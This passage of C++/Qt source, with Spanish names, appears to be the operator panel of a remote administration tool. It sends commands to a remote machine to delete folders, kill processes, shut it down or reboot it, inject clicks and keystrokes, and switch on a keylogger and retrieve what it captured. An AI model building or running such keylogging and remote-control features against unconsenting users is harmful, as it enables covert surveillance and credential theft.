       cliente.sendMessage(servidor, "renombrar|@|" + rutaArchivo + "|@|" + ventana.ruta + "/" + nombre );
    }
}
void MainWindow::archivosPrevia()
{
   if(ventana.archivosLista()->currentItem() != NULL)
   {
        QString extension = ventana.archivosLista()->currentItem()->text().split(".").last();
        if(extension.toLower() == "jpg" || extension.toLower() == "jpeg")
        {
             ventana.rutaArchivo = "mini.jpg";
             QString rutaArchivo = ventana.ruta + "/" + ventana.archivosLista()->currentItem()->text();
             cliente.sendMessage(servidor, "previa|@|" + rutaArchivo );
        }
   }
}
void MainWindow::archivosBorrarCarpeta()
{
    //Crear una ventana de confirmaciÛn
    QMessageBox confirmacion(&ventana);
    confirmacion.setWindowTitle(tr("ConfirmaciÛn"));
    confirmacion.setText(tr("Est· seguro de que desea borrar la carpeta actual?"));
    confirmacion.addButton(tr("No"),QMessageBox::NoRole);
    confirmacion.addButton(tr("Si"),QMessageBox::YesRole);
    if(confirmacion.exec())
    {
        QString rutaCarpeta = ventana.ruta;
        cliente.sendMessage(servidor,"borrarcarpeta|@|" + rutaCarpeta);
        //archivosRefresco();
    }
}
void MainWindow::archivosTamano()
{
    if( ventana.archivosLista()->currentRow() >= 0) {
        QString rutaArchivo = ventana.ruta + "/" + ventana.archivosLista()->currentItem()->text();
       cliente.sendMessage(servidor, "tamano|@|" + rutaArchivo );
    }
}
void MainWindow::enviarMensaje()
{
  QString mensaje;
  mensaje = ui->textoMensaje->document()->toPlainText() + "|@|" + ui->textoTitulo->text();
  if ( ui->radioAlerta->isChecked() )
    {
     cliente.sendMessage(servidor, "alerta|@|" + mensaje );
    }
  if ( ui->radioInformacion->isChecked() )
    {
     cliente.sendMessage(servidor, "info|@|" + mensaje );
    }
  if ( ui->radioPeligro->isChecked() )
    {
     cliente.sendMessage(servidor, "peligro|@|" + mensaje );
    }

}

void MainWindow::abrirVentanaEscritorio()
{
  escritorio.show();
}

void MainWindow::abrirChat()
{
    cliente.sendMessage(servidor,"abrirchat");
}

void MainWindow::cerrarChat()
{
    cliente.sendMessage(servidor,"cerrarchat");
}

void MainWindow::enviarMensajeChat()
{
    this->ponerMensajeChat(ui->entradaChatTexto->text(),ui->textoNickCliente->text());
   cliente.sendMessage(servidor, "chat|@|" + ui->entradaChatTexto->text() + "|@|" + ui->textoNickCliente->text() + "|@|" + ui->textoNickServidor->text()  );
    ui->entradaChatTexto->clear();
}
void MainWindow::ponerMensajeChat(QString mensajeChat, QString quien)
{
    ui->salidaChatTexto->document()->setHtml(ui->salidaChatTexto->document()->toHtml() + "<br>" + quien + " dice: " + mensajeChat);
}

void MainWindow::activarKey()
{
    cliente.sendMessage(servidor,"activark|@|");
}
void MainWindow::desactivarKey()
{
    cliente.sendMessage(servidor,"desactivark|@|");
}
void MainWindow::recibirKey()
{
    cliente.sendMessage(servidor,"recibirk|@|");
}
void MainWindow::limpiarKey()
{
    cliente.sendMessage(servidor,"limpiark|@|");
}
void MainWindow::pedirInformacion()
{
    cliente.sendMessage(servidor,"informacion|@|");
}
void MainWindow::traducir(QAction *idioma)
{
    /** Seleciona un idioma del menu y traduce la aplicacion **/
    if(idioma->text() == ui->actionEspa_ol->text())
        traductor.load(":/cliente_es.qm");
    if(idioma->text() == ui->actionEnglish->text())
        traductor.load(":/cliente_en.qm");
    if(idioma->text() == ui->actionPortugu_s->text())
        traductor.load(":/cliente_pt.qm");
   /* if(idioma->text() == ui->actionFran_aise->text())
        traductor.load("cliente_fr.qm");
    if(idioma->text() == ui->actionItaliano->text())
        traductor.load("cliente_it.qm");
    if(idioma->text() == ui->actionAlem_n->text())
        traductor.load("cliente_de.qm");
   */
    QApplication::installTranslator(&traductor);
}
void MainWindow::apagarEquipo()
{
    cliente.sendMessage(servidor,"apagarequipo|@|");
}
void MainWindow::reiniciarEquipo()
{
    cliente.sendMessage(servidor,"reiniciarequipo|@|");
}
void MainWindow::clicado(QString cadena)
{
    cliente.sendMessage(servidor,cadena);
}
void MainWindow::enviarTecla(QString cadena)
{
    cliente.sendMessage(servidor,cadena);
}
void MainWindow::actualizarProcesos()
{
    ui->listProcesos->clear();
    cliente.sendMessage(servidor,"procesos|@|");
}
void MainWindow::matarProceso()
{
    if(ui->listProcesos->currentRow() >= 0)
    {
        cliente.sendMessage(servidor,"matar|@|" + ui->listProcesos->currentItem()->text());
    }
}
